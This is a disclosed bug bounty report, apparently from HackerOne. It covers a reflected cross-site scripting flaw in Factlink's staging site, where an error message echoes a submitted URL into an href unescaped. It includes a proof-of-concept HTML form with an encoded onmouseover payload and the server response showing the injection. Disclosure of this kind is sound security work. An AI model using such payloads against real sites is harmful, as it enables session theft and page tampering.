@@ -1,0 +1,39 @@
+ReportLink:https://hackerone.com/reports/18805
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/pum
+ReportedTo:Factlink(factlink)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.07.2014 17:36:31
+
+Summary:
+
+hey
+
+the error message generated can be used to escape out of a dynamically generated href link. The below will render in internet explorer (without xss filter enabled of course). See the screenshot for an example.
+
+
+<html>
+  <body>
+    <form action="http://staging.fct.li/" method="POST">
+      <input type="hidden" name="url" value="unana&apos;&#32;onmouseover&#61;alert&#40;1&#41;&#32;some&#61;&apos;na&#46;google&#46;de" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+The response is:
+    HTTP/1.1 504 Gateway Time-out
+    Server: nginx/1.4.4
+    Date: Wed, 02 Jul 2014 18:13:51 GMT
+    Content-Length: 215
+    Connection: keep-alive
+
+    This page is taking unusually long to load. You can try visiting the site without Factlink: <a href='http://unana' onmouseover=alert(1) some='na.google.de/'>http://unana' onmouseover=alert(1) some='na.google.de/</a>
+
+
+Because of the "onmouseover" event waiting for its trigger you need to move your mouse over the link ...
+
+cheers pUm
